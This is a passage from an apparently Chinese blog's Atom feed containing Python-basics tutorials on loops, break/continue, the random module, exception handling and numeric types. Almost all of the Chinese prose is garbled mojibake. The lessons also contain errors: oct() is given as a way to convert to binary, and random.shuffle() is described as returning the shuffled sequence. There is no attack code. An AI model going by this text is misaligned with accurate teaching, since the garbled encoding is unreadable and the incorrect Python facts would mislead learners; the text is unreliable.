¹æ®å¾ªç¯æ‰§è¡Œæ¬¡æ•°çš„ç¡®å®šæ€§ï¼Œå¾ªç¯å¯ä»¥åˆ†ä¸ºç¡®å®šæ¬¡æ•°å¾ªç¯å’Œéç¡®å®šæ¬¡æ•°å¾ªç¯ã€‚ç¡®å®šæ¬¡æ•°å¾ªç¯æŒ‡å¾ªç¯ä½“å¯¹å¾ªç¯æ¬¡æ•°æœ‰æ˜ç¡®çš„å®šä¹‰ï¼Œå¾ªç¯æ¬¡æ•°é‡‡ç”¨éå†ç»“æ„ä¸­å…ƒç´ ä¸ªæ•°æ¥ä½“ç°ã€‚</p><p>Pythoné€šè¿‡ä¿ç•™å­—forå®ç°â€œéå†å¾ªç¯â€ ï¼š</p><p>for &lt;å¾ªç¯å˜é‡&gt; in &lt;éå†ç»“æ„&gt;:</p><p>  &lt;è¯­å¥å—&gt;</p><p>éå†ç»“æ„å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ–‡ä»¶ã€ç»„åˆæ•°æ®ç±»å‹æˆ–range()å‡½æ•°ï¼š</p><table><thead><tr><th>å¾ªç¯Næ¬¡  for  i in  range(N):     &lt;è¯­å¥å—&gt;</th><th>éå†æ–‡ä»¶fiçš„æ¯ä¸€è¡Œ  for  line in fi:    &lt;è¯­å¥å—&gt;</th><th>éå†å­—ç¬¦ä¸²s   for  c in s:    &lt;è¯­å¥å—&gt;</th><th>éå†åˆ—è¡¨ls   for  item in ls:    &lt;è¯­å¥å—&gt;</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p>éå†å¾ªç¯è¿˜æœ‰ä¸€ç§æ‰©å±•æ¨¡å¼ï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>for &lt;å¾ªç¯å˜é‡&gt; in &lt;éå†ç»“æ„&gt;:</p><p>â€‹    &lt;è¯­å¥å—1&gt;</p><p>else:</p><p>â€‹    &lt;è¯­å¥å—2&gt;</p><p>å½“forå¾ªç¯æ­£å¸¸æ‰§è¡Œä¹‹åï¼Œç¨‹åºä¼šç»§ç»­æ‰§è¡Œelseè¯­å¥ä¸­å†…å®¹ã€‚<strong>elseè¯­å¥åªåœ¨å¾ªç¯æ­£å¸¸æ‰§è¡Œä¹‹åæ‰æ‰§è¡Œå¹¶ç»“æŸï¼Œ</strong>å› æ­¤ï¼Œå¯ä»¥åœ¨&lt;è¯­å¥å—2&gt;ä¸­æ”¾ç½®åˆ¤æ–­å¾ªç¯æ‰§è¡Œæƒ…å†µçš„è¯­å¥</p><h3 id="æ— é™å¾ªç¯-whileè¯­å¥"><a href="#æ— é™å¾ªç¯-whileè¯­å¥" class="headerlink" title="æ— é™å¾ªç¯: whileè¯­å¥"></a>æ— é™å¾ªç¯: whileè¯­å¥</h3><p>æ— é™å¾ªç¯ï¼š</p><p>æ— é™å¾ªç¯ä¸€ç›´ä¿æŒå¾ªç¯æ“ä½œç›´åˆ°ç‰¹å®šå¾ªç¯æ¡ä»¶ä¸è¢«æ»¡è¶³æ‰ç»“æŸï¼Œä¸éœ€è¦æå‰çŸ¥é“ç¡®å®šå¾ªç¯æ¬¡æ•°ã€‚</p><p>Pythoné€šè¿‡ä¿ç•™å­—whileå®ç°æ— é™å¾ªç¯ï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>while &lt;æ¡ä»¶&gt;:</p><p>â€‹    &lt;è¯­å¥å—&gt;</p><p>æ— é™å¾ªç¯ä¹Ÿæœ‰ä¸€ç§ä½¿ç”¨ä¿ç•™å­—elseçš„æ‰©å±•æ¨¡å¼ï¼Œelseè¯­å¥åªåœ¨å¾ªç¯æ­£å¸¸æ‰§è¡Œä¹‹åæ‰æ‰§è¡Œï¼š</p><p>while &lt;æ¡ä»¶&gt;:</p><p>â€‹    &lt;è¯­å¥å—1&gt;</p><p>else:</p><p>â€‹    &lt;è¯­å¥å—2&gt;</p><h3 id="å¾ªç¯ä¿ç•™å­—-breakå’Œcontinue"><a href="#å¾ªç¯ä¿ç•™å­—-breakå’Œcontinue" class="headerlink" title="å¾ªç¯ä¿ç•™å­—: breakå’Œcontinue"></a>å¾ªç¯ä¿ç•™å­—: breakå’Œcontinue</h3><p>å¾ªç¯ç»“æ„æœ‰ä¸¤ä¸ªè¾…åŠ©ä¿ç•™å­—ï¼šbreakå’Œcontinueï¼Œå®ƒä»¬ç”¨æ¥è¾…åŠ©æ§åˆ¶å¾ªç¯æ‰§è¡Œ</p><p>breakç”¨æ¥è·³å‡ºæœ€å†…å±‚foræˆ–whileå¾ªç¯ï¼Œè„±ç¦»è¯¥å¾ªç¯åç¨‹åºä»å¾ªç¯åä»£ç ç»§ç»­æ‰§è¡Œ </p><blockquote><p>å…¶ä¸­ï¼Œbreakè¯­å¥è·³å‡ºäº†æœ€å†…å±‚forå¾ªç¯ï¼Œä½†ä»ç„¶ç»§ç»­æ‰§è¡Œå¤–å±‚å¾ªç¯ã€‚æ¯ä¸ªbreakè¯­å¥åªæœ‰èƒ½åŠ›è·³å‡ºå½“å‰å±‚æ¬¡å¾ªç¯ </p></blockquote><p>continueç”¨æ¥ç»“æŸå½“å‰å½“æ¬¡å¾ªç¯ï¼Œå³è·³å‡ºå¾ªç¯ä½“ä¸­ä¸‹é¢å°šæœªæ‰§è¡Œçš„è¯­å¥ï¼Œä½†ä¸è·³å‡ºå½“å‰å¾ªç¯ã€‚</p><p>å¯¹äºwhileå¾ªç¯ï¼Œç»§ç»­æ±‚è§£å¾ªç¯æ¡ä»¶ã€‚è€Œå¯¹äºforå¾ªç¯ï¼Œç¨‹åºæµç¨‹æ¥ç€éå†å¾ªç¯åˆ—è¡¨</p><blockquote><p>continueè¯­å¥å’Œbreakè¯­å¥çš„åŒºåˆ«æ˜¯ï¼š</p><p>continueè¯­å¥åªç»“æŸæœ¬æ¬¡å¾ªç¯ï¼Œè€Œä¸ç»ˆæ­¢æ•´ä¸ªå¾ªç¯çš„æ‰§è¡Œã€‚</p><p>breakè¯­å¥åˆ™æ˜¯ç»“æŸæ•´ä¸ªå¾ªç¯è¿‡ç¨‹ï¼Œä¸å†åˆ¤æ–­æ‰§è¡Œå¾ªç¯çš„æ¡ä»¶æ˜¯å¦æˆç«‹</p></blockquote><p>forå¾ªç¯å’Œwhileå¾ªç¯ä¸­éƒ½å­˜åœ¨ä¸€ä¸ªelseæ‰©å±•ç”¨æ³•ã€‚</p><p>elseä¸­çš„è¯­å¥å—åªåœ¨ä¸€ç§æ¡ä»¶ä¸‹æ‰§è¡Œï¼Œå³å¾ªç¯æ­£å¸¸éå†äº†æ‰€æœ‰å†…å®¹æ²¡æœ‰å› ä¸ºbreakæˆ–returnè€Œé€€å‡ºã€‚</p><p>continueä¿ç•™å­—å¯¹elseæ²¡æœ‰å½±å“ã€‚</p><h2 id="randomåº“æ¦‚è¿°"><a href="#randomåº“æ¦‚è¿°" class="headerlink" title="randomåº“æ¦‚è¿°"></a>randomåº“æ¦‚è¿°</h2><p>éšæœºæ•°åœ¨è®¡ç®—æœºåº”ç”¨ä¸­ååˆ†å¸¸è§ï¼ŒPythonå†…ç½®çš„randomåº“ä¸»è¦ç”¨äºäº§ç”Ÿå„ç§åˆ†å¸ƒçš„ä¼ªéšæœºæ•°åºåˆ—ã€‚randomåº“é‡‡ç”¨æ¢…æ£®æ—‹è½¬ç®—æ³•ï¼ˆMersenne twisterï¼‰ç”Ÿæˆä¼ªéšæœºæ•°åºåˆ—ï¼Œå¯ç”¨äºé™¤éšæœºæ€§è¦æ±‚æ›´é«˜çš„åŠ è§£å¯†ç®—æ³•å¤–çš„å¤§å¤šæ•°å·¥ç¨‹åº”ç”¨ã€‚</p><p>ä½¿ç”¨randomåº“ä¸»è¦ç›®çš„æ˜¯ç”Ÿæˆéšæœºæ•°ï¼Œå› æ­¤ï¼Œè¯»è€…åªéœ€è¦æŸ¥é˜…è¯¥åº“çš„éšæœºæ•°ç”Ÿæˆå‡½æ•°ï¼Œæ‰¾åˆ°ç¬¦åˆä½¿ç”¨åœºæ™¯çš„å‡½æ•°ä½¿ç”¨å³å¯ã€‚è¿™ä¸ªåº“æä¾›äº†ä¸åŒç±»å‹çš„éšæœºæ•°å‡½æ•°ï¼Œæ‰€æœ‰å‡½æ•°éƒ½æ˜¯åŸºäºæœ€åŸºæœ¬çš„random.random()å‡½æ•°æ‰©å±•è€Œæ¥ã€‚</p><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>seed(a=None)</td><td>åˆå§‹åŒ–éšæœºæ•°ç§å­ï¼Œé»˜è®¤å€¼ä¸ºå½“å‰ç³»ç»Ÿæ—¶é—´</td></tr><tr><td>random()</td><td>ç”Ÿæˆä¸€ä¸ª[0.0,  1.0)ä¹‹é—´çš„éšæœºå°æ•°</td></tr><tr><td>randint(a, b)</td><td>ç”Ÿæˆä¸€ä¸ª[a,b]ä¹‹é—´çš„æ•´æ•°</td></tr><tr><td>getrandbits(k)</td><td>ç”Ÿæˆä¸€ä¸ªkæ¯”ç‰¹é•¿åº¦çš„éšæœºæ•´æ•°</td></tr><tr><td>randrange(start, stop[, step])</td><td>ç”Ÿæˆä¸€ä¸ª[start,  stop)ä¹‹é—´ä»¥stepä¸ºæ­¥æ•°çš„éšæœºæ•´æ•°</td></tr><tr><td>uniform(a, b)</td><td>ç”Ÿæˆä¸€ä¸ª[a,  b]ä¹‹é—´çš„éšæœºå°æ•°</td></tr><tr><td>choice(seq)</td><td>ä»åºåˆ—ç±»å‹(ä¾‹å¦‚ï¼šåˆ—è¡¨)ä¸­éšæœºè¿”å›ä¸€ä¸ªå…ƒç´ </td></tr><tr><td>shuffle(seq)</td><td>å°†åºåˆ—ç±»å‹ä¸­å…ƒç´ éšæœºæ’åˆ—ï¼Œè¿”å›æ‰“ä¹±åçš„åºåˆ—</td></tr><tr><td>sample(pop, k)</td><td>ä»popç±»å‹ä¸­éšæœºé€‰å–kä¸ªå…ƒç´ ï¼Œä»¥åˆ—è¡¨ç±»å‹è¿”å›</td></tr></tbody></table><p>ç”Ÿæˆéšæœºæ•°ä¹‹å‰å¯ä»¥é€šè¿‡seed()å‡½æ•°æŒ‡å®šéšæœºæ•°ç§å­ï¼Œéšæœºç§å­ä¸€èˆ¬æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œåªè¦ç§å­ç›¸åŒï¼Œæ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°åºåˆ—ä¹Ÿç›¸åŒã€‚è¿™ç§æƒ…å†µä¾¿äºæµ‹è¯•å’ŒåŒæ­¥æ•°æ®</p><blockquote><p>å¥½ä¸€ä¸ªåºåˆ—å¯†ç </p></blockquote><h2 id="ç¨‹åºçš„å¼‚å¸¸å¤„ç†"><a href="#ç¨‹åºçš„å¼‚å¸¸å¤„ç†" class="headerlink" title="ç¨‹åºçš„å¼‚å¸¸å¤„ç†"></a>ç¨‹åºçš„å¼‚å¸¸å¤„ç†</h2><p>åˆå­¦ä¸å¿…å¤ªè¿‡äºè®¡è¾ƒè¿™ä¸ªåœ°æ–¹</p><blockquote><p>Pythonå¼‚å¸¸ä¿¡æ¯ä¸­æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯å¼‚å¸¸ç±»å‹ï¼Œå®ƒè¡¨æ˜äº†å‘ç”Ÿå¼‚å¸¸çš„åŸå› ï¼Œä¹Ÿæ˜¯ç¨‹åºå¤„ç†å¼‚å¸¸çš„ä¾æ®ã€‚</p><p>Pythonä½¿ç”¨try-exceptè¯­å¥å®ç°å¼‚å¸¸å¤„ç†ï¼ŒåŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>try:</p><p> &lt;è¯­å¥å—1&gt;</p><p>except &lt;å¼‚å¸¸ç±»å‹&gt;:</p><p> &lt;è¯­å¥å—2&gt;</p></blockquote><p>try è¯­å¥çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆï¼Œæ‰§è¡Œ try å­å¥çš„è¯­å¥å—ã€‚</p><p>å¦‚æœæ²¡æœ‰å¼‚å¸¸å‘ç”Ÿï¼Œåˆ™è·³è¿‡ except å­å¥ã€‚</p><p>å¦‚æœå‘ç”Ÿäº†å¼‚å¸¸ï¼Œåˆ™è·³è¿‡ try å­å¥ä¸­å‰©ä½™çš„è¯­å¥éƒ¨åˆ†ã€‚ç„¶åï¼Œå¦‚æœå¼‚å¸¸ç±»å‹å’Œ except å…³é”®å­—åé¢çš„å¼‚å¸¸ç±»å‹åŒ¹é…ï¼ˆåŒä¸€ä¸ªç±»æˆ–è€…æ˜¯å®ƒçš„åŸºç±»ï¼‰ï¼Œåˆ™æ‰§è¡Œ except å­å¥çš„è¯­å¥å—ã€‚</p><p>å¦‚æœå‘ç”Ÿçš„å¼‚å¸¸å’Œ except å­å¥ä¸­çš„å¼‚å¸¸ä¸åŒ¹é…ï¼Œåˆ™å°†å…¶ä¼ é€’åˆ°å¤–éƒ¨çš„ try è¯­å¥ä¸­ï¼›å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¤„ç†ç¨‹åºï¼Œåˆ™å®ƒæ˜¯ä¸€ä¸ªæœªå¤„ç†å¼‚å¸¸ï¼Œæ‰§è¡Œå°†åœæ­¢å¹¶æ˜¾ç¤ºå¼‚å¸¸ä¿¡æ¯ã€‚</p><blockquote><p>NameError </p><p>ZeroDivisionError</p><p>TypeError</p><p>SyntaxError</p><p>IndexError  ç´¢å¼•è¶…å‡ºåºåˆ—èŒƒå›´</p><p>KeyError  è¯·æ±‚ä¸€ä¸ªä¸å­˜åœ¨çš„å­—å…¸å…³é”®å­—</p><p>IOError    è¾“å…¥è¾“å‡ºé”™è¯¯</p><p>AttributeError  å°è¯•è®¿é—®æœªçŸ¥çš„å¯¹è±¡å±æ€§</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pythonåŸºç¡€-äºŒ&quot;&gt;&lt;a href=&quot;#pythonåŸºç¡€-äºŒ&quot; class=&quot;headerlink&quot; title=&quot;pythonåŸºç¡€(äºŒ)&quot;&gt;&lt;/a&gt;pythonåŸºç¡€(äºŒ)&lt;/h1&gt;&lt;h2 id=&quot;ç¨‹åºçš„åŸºæœ¬ç»“æ„&quot;&gt;&lt;a href=&quot;#ç¨‹åºçš„åŸºæœ¬ç»“æ„&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://websec.space/categories/python/"/>
    
    
    <category term="python" scheme="http://websec.space/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pythonåŸºç¡€(ä¸€)</title>
    <link href="http://websec.space/2021/12/18/python%E5%9F%BA%E7%A1%80/"/>
    <id>http://websec.space/2021/12/18/python%E5%9F%BA%E7%A1%80/</id>
    <published>2021-12-17T16:00:00.000Z</published>
    <updated>2021-12-20T06:49:30.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pythonåŸºç¡€-ä¸€"><a href="#pythonåŸºç¡€-ä¸€" class="headerlink" title="pythonåŸºç¡€(ä¸€)"></a>pythonåŸºç¡€(ä¸€)</h1><h2 id="ç¨‹åºè®¾è®¡åŸºæœ¬æ–¹æ³•"><a href="#ç¨‹åºè®¾è®¡åŸºæœ¬æ–¹æ³•" class="headerlink" title="ç¨‹åºè®¾è®¡åŸºæœ¬æ–¹æ³•"></a>ç¨‹åºè®¾è®¡åŸºæœ¬æ–¹æ³•</h2><blockquote><p>ç¨‹åºè®¾è®¡è¯­è¨€åˆ†ç±»</p><p>æœºå™¨è¯­è¨€</p><p>æ±‡ç¼–è¯­è¨€</p><p>é«˜çº§è¯­è¨€</p><p>ç¼–è¯‘å’Œè§£é‡Š</p><p>é™æ€è¯­è¨€ï¼ˆ C/C++ã€Java ï¼‰ã€ç¼–è¯‘å‹è¯­è¨€</p><p>è„šæœ¬è¯­è¨€ï¼ˆPythonã€JavaScriptã€PHPï¼‰ã€è§£é‡Šå‹è¯­è¨€</p></blockquote><h2 id="Pythonç¨‹åºå®ä¾‹è§£æ"><a href="#Pythonç¨‹åºå®ä¾‹è§£æ" class="headerlink" title="Pythonç¨‹åºå®ä¾‹è§£æ"></a>Pythonç¨‹åºå®ä¾‹è§£æ</h2><p><img src="https://img-blog.csdnimg.cn/2a70cad13fd04cc68db4ef8a62b5d13f.png" alt="img"></p><p>ä½¿ç”¨importå¼•å…¥å‡½æ•°åº“æœ‰ä¸¤ç§æ–¹å¼ï¼Œå¯¹å‡½æ•°çš„ä½¿ç”¨æ–¹å¼ç•¥æœ‰ä¸åŒ</p><p>ç¬¬ä¸€ç§ï¼šimport &lt;åº“å&gt;</p><p>  å‡½æ•°è°ƒç”¨æ–¹å¼ï¼š&lt;åº“å&gt;.&lt;å‡½æ•°å&gt;(&lt;å‡½æ•°å‚æ•°&gt;)</p><p>ç¬¬äºŒç§ï¼šfrom &lt;åº“å&gt; import &lt;å‡½æ•°å&gt;</p><p>â€‹        from &lt;åº“å&gt; import * (é€šé…ç¬¦)</p><p>  å‡½æ•°è°ƒç”¨æ–¹å¼ï¼š&lt;å‡½æ•°å&gt;(&lt;å‡½æ•°å‚æ•°&gt;)</p><h2 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h2><h3 id="æ•°å­—ç±»å‹"><a href="#æ•°å­—ç±»å‹" class="headerlink" title="æ•°å­—ç±»å‹"></a>æ•°å­—ç±»å‹</h3><p><img src="https://img-blog.csdnimg.cn/bf5736d5285847cc82fbdb3f54bfc9fe.png" alt="img"></p><h4 id="æ•´æ•°å‹"><a href="#æ•´æ•°å‹" class="headerlink" title="æ•´æ•°å‹"></a>æ•´æ•°å‹</h4><p>åè¿›åˆ¶ã€äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åå…­è¿›åˆ¶</p><blockquote><p>ç¤ºä¾‹</p><p> 1010, 99, -217 </p><p> 0x9a, -0X89  (0x, 0Xå¼€å¤´è¡¨ç¤º16è¿›åˆ¶æ•°) </p><p> 0b010, -0B101 (0b, 0Bå¼€å¤´è¡¨ç¤º2è¿›åˆ¶æ•°) </p><p> 0o123, -0O456 (0o, 0Oå¼€å¤´è¡¨ç¤º8è¿›åˆ¶æ•°)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¿›åˆ¶è½¬æ¢(åªæ¼”ç¤ºåè¿›åˆ¶è½¬äºŒè¿›åˆ¶)</span></span><br><span class="line">a=<span class="number">1010</span></span><br><span class="line"><span class="comment">#è½¬ä¸ºäºŒè¿›åˆ¶</span></span><br><span class="line"><span class="comment">#æ–¹æ³•ä¸€</span></span><br><span class="line">b=<span class="built_in">format</span>(a,<span class="string">&#x27;b&#x27;</span>) <span class="comment">#æ­¤æ—¶bä¸ºstrç±»å‹</span></span><br><span class="line"><span class="comment">#æ–¹æ³•äºŒ</span></span><br><span class="line">b=<span class="built_in">oct</span>(a)</span><br></pre></td></tr></table></figure><p> è¿›åˆ¶è½¬æ¢</p><p>ä¸æ•°å­¦ä¸­çš„æ•´æ•°æ¦‚å¿µä¸€è‡´ï¼Œæ²¡æœ‰å–å€¼èŒƒå›´é™åˆ¶(python 2.2ä¹‹åå–æ¶ˆäº†æ™®é€šæ•´å‹å’Œé•¿æ•´å‹ï¼Œä¼šè‡ªåŠ¨è½¬æ¢ä¸ºé•¿æ•´å‹)</p><p>pow(x, y)å‡½æ•°ï¼šè®¡ç®—x<sup>y</sup></p><p>pow(2,10)=1024</p><h4 id="æµ®ç‚¹æ•°ç±»å‹"><a href="#æµ®ç‚¹æ•°ç±»å‹" class="headerlink" title="æµ®ç‚¹æ•°ç±»å‹"></a>æµ®ç‚¹æ•°ç±»å‹</h4><p>å¸¦æœ‰å°æ•°çš„æ•°å€¼</p><p>æµ®ç‚¹æ•°ç±»å‹ä¸æ•´æ•°ç±»å‹ç”±è®¡ç®—æœºçš„ä¸åŒç¡¬ä»¶å•å…ƒæ‰§è¡Œï¼Œå¤„ç†æ–¹æ³•ä¸åŒã€‚æ•…è€Œæµ®ç‚¹æ•°0.0ä¸æ•´æ•°0å€¼ç›¸åŒï¼Œä½†æ˜¯åœ¨è®¡ç®—æœºå†…éƒ¨è¡¨ç¤ºä¸åŒã€‚</p><p>Pythonè¯­è¨€ä¸­æµ®ç‚¹æ•°çš„æ•°å€¼èŒƒå›´å­˜åœ¨é™åˆ¶ï¼Œå°æ•°ç²¾åº¦ä¹Ÿå­˜åœ¨é™åˆ¶ã€‚å—ä¸åŒè®¡ç®—æœºç³»ç»Ÿçš„é™åˆ¶</p><p>næµ®ç‚¹æ•°ç±»å‹ä¸æ•´æ•°ç±»å‹ç”±è®¡ç®—æœºçš„ä¸åŒç¡¬ä»¶å•å…ƒæ‰§è¡Œï¼Œå¤„ç†æ–¹æ³•ä¸åŒã€‚æ•…è€Œæµ®ç‚¹æ•°0.0ä¸æ•´æ•°0å€¼ç›¸åŒï¼Œä½†æ˜¯åœ¨è®¡ç®—æœºå†…éƒ¨è¡¨ç¤ºä¸åŒã€‚</p><blockquote><p>n0.0, -77., -2.17 </p><p>n 96e4, 4.3e-3, 9.6E5 ï¼ˆç§‘å­¦è®¡æ•°æ³•ï¼‰</p><p>n ç§‘å­¦è®¡æ•°æ³•ä½¿ç”¨å­—æ¯â€œeâ€æˆ–è€…â€œEâ€ä½œä¸ºå¹‚çš„ç¬¦å·ï¼Œä»¥10ä¸ºåŸºæ•°ã€‚ç§‘å­¦è®¡æ•°æ³•å«ä¹‰å¦‚ä¸‹ï¼š</p><p>Â Â Â Â Â Â Â Â Â Â  <a>e<b> = a * 10<sup>b</sup></p></blockquote><p>æµ®ç‚¹æ•°ç±»å‹ç›´æ¥è¡¨ç¤ºæˆ–ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºä¸­çš„ç³»æ•°æœ€é•¿å¯è¾“å‡º16ä¸ªæ•°å­—ï¼Œæµ®ç‚¹æ•°è¿ç®—ç»“æ„ä¸­æœ€é•¿å¯è¾“å‡º17ä¸ªæ•°å­—ï¼Œç„¶è€Œæ ¹æ® sys.float_infoç»“æœï¼Œè®¡ç®—æœºåªèƒ½æä¾›15ä¸ªæ•°å­—çš„å‡†ç¡®æ€§ï¼Œæœ€åä¸€ä½ç”±è®¡ç®—æœºæ ¹æ®äºŒè¿›åˆ¶è®¡ç®—ç»“æœç¡®å®šï¼Œå­˜åœ¨è¯¯å·®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;1.2345678912345678</span><br><span class="line">1.234567891234568</span><br></pre></td></tr></table></figure><p>æµ®ç‚¹æ•°åœ¨è¶…è¿‡15ä½æ•°å­—è®¡ç®—ä¸­äº§ç”Ÿçš„è¯¯å·®ä¸è®¡ç®—æœºå†…éƒ¨é‡‡ç”¨äºŒè¿›åˆ¶è¿ç®—æœ‰å…³ã€‚(è®¡ç®—æœºç»„æˆåŸç†)</p><p>ç”±äºpythonè¯­è¨€èƒ½å¤Ÿæ”¯æŒæ— é™ä¸”å‡†ç¡®çš„æ•´æ•°è¿ç®—ï¼Œå› æ­¤ï¼Œå¦‚æœå¸Œæœ›è·å¾—ç²¾åº¦æ›´é«˜çš„è®¡ç®—ç»“æœï¼Œå¾€å¾€é‡‡ç”¨æ•´æ•°è€Œä¸ç›´æ¥ç”¨æµ®ç‚¹æ•°ã€‚</p><p><img src="https://img-blog.csdnimg.cn/99b811ed8b7143e390026b990d80b80b.png" alt="img"></p><p>(ä½¿ç”¨æ ‡å‡†åº“decimalè¿›è¡Œé«˜ç²¾åº¦æµ®ç‚¹æ•°è¿ç®—ã€‚)</p><h4 id="å¤æ•°ç±»å‹"><a href="#å¤æ•°ç±»å‹" class="headerlink" title="å¤æ•°ç±»å‹"></a>å¤æ•°ç±»å‹</h4><p>ä¸æ•°å­¦ä¸­çš„å¤æ•°æ¦‚å¿µä¸€è‡´, z = a + bjï¼Œ aæ˜¯å®æ•°éƒ¨åˆ†ï¼Œbæ˜¯è™šæ•°éƒ¨åˆ†ï¼Œaå’Œbéƒ½æ˜¯æµ®ç‚¹ç±»å‹ï¼Œè™šæ•°éƒ¨åˆ†ç”¨jæˆ–è€…Jæ ‡è¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12.3+4j,   -5.6+7j</span><br></pre></td></tr></table></figure><blockquote><p>z = 1.23e-4+5.6e+89jï¼ˆå®éƒ¨å’Œè™šéƒ¨æ˜¯ä»€ä¹ˆï¼Ÿï¼‰</p><p>å¯¹äºå¤æ•°zï¼Œå¯ä»¥ç”¨z.realè·å¾—å®æ•°éƒ¨åˆ†ï¼Œz.imagè·å¾—è™šæ•°éƒ¨åˆ†</p><p>z.real = 0.000123  z.imag = 5.6e+89</p></blockquote><h4 id="pythonçš„æ“ä½œ"><a href="#pythonçš„æ“ä½œ" class="headerlink" title="pythonçš„æ“ä½œ"></a>pythonçš„æ“ä½œ</h4><p>Pythonè§£é‡Šå™¨ä¸ºæ•°å­—ç±»å‹æä¾›æ•°å€¼è¿ç®—æ“ä½œç¬¦ã€æ•°å€¼è¿ç®—å‡½æ•°ã€ç±»å‹è½¬æ¢å‡½æ•°ç­‰æ“ä½œæ–¹æ³•ã€‚</p><p>Pythonæä¾›äº†ä¹ä¸ªåŸºæœ¬çš„æ•°å€¼è¿ç®—æ“ä½œç¬¦ã€‚</p><p>ç”±Pythonè§£é‡Šå™¨ç›´æ¥æä¾›ï¼Œä¸éœ€è¦å¼•ç”¨æ ‡å‡†æˆ–ç¬¬ä¸‰æ–¹å‡½æ•°åº“ï¼Œä¹Ÿå«ä½œå†…ç½®æ“ä½œç¬¦ã€‚</p><table><thead><tr><th>æ“ä½œç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>x + y</td><td>xä¸yä¹‹å’Œ</td></tr><tr><td>x - y</td><td>xä¸yä¹‹å·®</td></tr><tr><td>x * y</td><td>xä¸yä¹‹ç§¯</td></tr><tr><td>x / y</td><td>xä¸yä¹‹å•†</td></tr><tr><td>x // y</td><td>xä¸yä¹‹æ•´æ•°å•†ï¼Œå³ï¼šä¸å¤§äºxä¸yä¹‹å•†çš„æœ€å¤§æ•´æ•°  (æ•´é™¤)</td></tr><tr><td>x % y</td><td>xä¸yä¹‹å•†çš„ä½™æ•°ï¼Œä¹Ÿç§°ä¸ºæ¨¡è¿ç®—</td></tr><tr><td>-x</td><td>xçš„è´Ÿå€¼ï¼Œå³ï¼šx*(-1)</td></tr><tr><td>+x</td><td>xæœ¬èº«</td></tr><tr><td>x**y</td><td>xçš„yæ¬¡å¹‚ï¼Œå³ï¼šx<sup>y</sup></td></tr></tbody></table><blockquote><p>æ“ä½œç¬¦çš„è¿ç®—ç»“æœå¯èƒ½æ”¹å˜æ•°å­—ç±»å‹ã€‚</p><p>ä¸‰ç§æ•°å­—ç±»å‹å­˜åœ¨ä¸€ç§é€æ¸â€œæ‰©å±•â€çš„å…³ç³»ï¼š</p><p>â€‹     æ•´æ•° -&gt; æµ®ç‚¹æ•° -&gt; å¤æ•° </p><p>â€‹    ï¼ˆæ•´æ•°æ˜¯æµ®ç‚¹æ•°ç‰¹ä¾‹ï¼Œæµ®ç‚¹æ•°æ˜¯å¤æ•°ç‰¹ä¾‹ï¼‰</p><p>ä¸åŒæ•°å­—ç±»å‹ä¹‹é—´å¯ä»¥è¿›è¡Œæ··åˆè¿ç®—ï¼Œè¿ç®—åç”Ÿæˆç»“æœä¸ºæœ€å®½ç±»å‹</p><p>123 + 4.0 = 127.0 (æ•´æ•° + æµ®ç‚¹æ•° = æµ®ç‚¹æ•°)</p></blockquote><blockquote><p>æ•°å­—ç±»å‹ä¹‹é—´ç›¸äº’è¿ç®—æ‰€ç”Ÿæˆçš„ç»“æœæ˜¯â€œæ›´å®½â€çš„ç±»å‹ï¼ŒåŸºæœ¬è§„åˆ™æ˜¯ï¼š</p><p>æ•´æ•°ä¹‹é—´è¿ç®—ï¼Œå¦‚æœæ•°å­¦æ„ä¹‰ä¸Šçš„ç»“æœæ˜¯å°æ•°ï¼Œç»“æœæ˜¯æµ®ç‚¹æ•°ï¼ˆPython 3 ä¸Python 2çš„åŒºåˆ«ï¼‰ï¼›(æ³¨æ„æ•´é™¤//)</p><p>æ•´æ•°ä¹‹é—´è¿ç®—ï¼Œå¦‚æœæ•°å­¦æ„ä¹‰ä¸Šçš„ç»“æœæ˜¯æ•´æ•°ï¼Œç»“æœæ˜¯æ•´æ•°ï¼›</p><p>æ•´æ•°å’Œæµ®ç‚¹æ•°æ··åˆè¿ç®—ï¼Œè¾“å‡ºç»“æœæ˜¯æµ®ç‚¹æ•°ï¼›</p><p>æ•´æ•°æˆ–æµ®ç‚¹æ•°ä¸å¤æ•°è¿ç®—ï¼Œè¾“å‡ºç»“æœæ˜¯å¤æ•°ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#åœ¨python2ä¸­:</span><br><span class="line"></span><br><span class="line">10/4=2</span><br><span class="line"></span><br><span 